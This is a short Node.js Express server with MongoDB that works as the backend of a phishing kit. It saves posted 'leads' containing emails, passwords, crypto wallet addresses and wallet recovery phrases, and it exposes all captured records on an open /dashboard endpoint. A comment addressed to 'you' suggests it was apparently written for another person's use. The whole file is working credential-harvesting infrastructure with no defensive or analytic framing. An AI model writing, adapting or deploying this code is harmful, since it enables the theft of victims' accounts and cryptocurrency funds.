const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("Connected to MongoDB successfully"))
  .catch(err => console.error("Mongo connection error:", err));

const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema);

app.post('/update', async (req, res) => {
    try {
        const lead = new Lead(req.body);
        await lead.save();
        res.status(200).send("Saved.");
    } catch (err) {
        res.status(500).send("Error.");
    }
});

app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        res.status(500).send("Error.");
    }
});

// Changed this to match the filename you created
app.get('/dashboard.html', (req, res) => {
    res.sendFile(__dirname + '/dashboard.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
